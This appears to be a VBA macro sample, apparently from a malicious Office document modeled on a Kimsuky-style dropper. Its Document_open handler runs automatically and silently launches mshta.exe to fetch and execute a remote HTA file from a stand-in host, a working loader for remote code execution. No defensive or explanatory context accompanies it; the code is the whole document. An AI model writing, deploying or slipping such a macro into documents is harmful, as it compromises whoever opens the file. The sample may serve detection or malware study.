Public Function main() As Variant
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run ("C:\windows\system32\mshta.exe ""http://example.com/kimsuky.hta""  /f"), 0
    Set WshShell = Nothing
End Function
Sub Document_open()
    main
End Sub